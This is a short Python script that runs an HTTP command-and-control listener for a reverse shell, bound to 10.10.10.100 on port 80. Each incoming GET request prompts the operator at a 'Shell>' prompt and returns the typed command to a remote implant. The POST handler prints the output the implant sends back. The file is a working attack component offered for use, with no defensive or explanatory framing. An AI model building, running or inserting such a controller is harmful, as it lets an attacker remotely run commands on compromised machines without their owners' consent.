from http.server import BaseHTTPRequestHandler, HTTPServer

HOST_NAME = '10.10.10.100'
PORT_NUMBER = 80

class MyHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        command = input("Shell> ")
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(command.encode())

    def do_POST(self):
        self.send_response(200)
        self.end_headers()
        length = int(self.headers['Content-Length'])
        post_var = self.rfile.read(length)
        print(post_var.decode())

if __name__ == '__main__':
    server_class = HTTPServer
    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)

    try:
        print(f"[*] Server started on http://{HOST_NAME}:{PORT_NUMBER}/")
        httpd.serve_forever()
    except KeyboardInterrupt:
        print('[!] Server is terminated')
        httpd.server_close()
